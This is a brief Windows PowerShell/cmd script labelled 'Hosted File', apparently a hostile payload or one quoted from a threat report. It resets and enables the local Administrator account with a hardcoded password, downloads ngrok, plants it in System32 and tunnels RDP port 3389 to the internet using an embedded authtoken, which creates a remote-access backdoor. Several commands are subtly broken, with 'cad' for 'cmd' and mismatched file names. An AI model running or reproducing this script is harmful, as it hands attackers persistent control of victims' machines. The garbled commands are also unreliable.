Hosted File:
Set-LocalUser -Name “Administrator” -Password (ConvertTo-SecureString -AsPlainText “@rdpbyav321" -Force)
Get-LocalUser -Name “Administrator” | Enable-LocalUser
Invoke-WebRequest https://bin.equinox.io/c/4VmDzA7ialb/ngrok-stable-windows-amd64.zip -OutFile ngrok.zip
tar xf ngrok.zip
Copy ngrok.exe C:\Windows\System32
cad /c echo ./ngrok.exe authtoken “2DAZlrLltVEBCFGb8E7VEu9rnN9_6zkttEr4uBQiFKM6Rj2P4" >a.psi
cad /c echo cad /k start ngrok.exe tcp 3389 >>a.ps1
cad /c echo ping -n 999999 10.10.10.10 >>a.ps1
.\a.psi
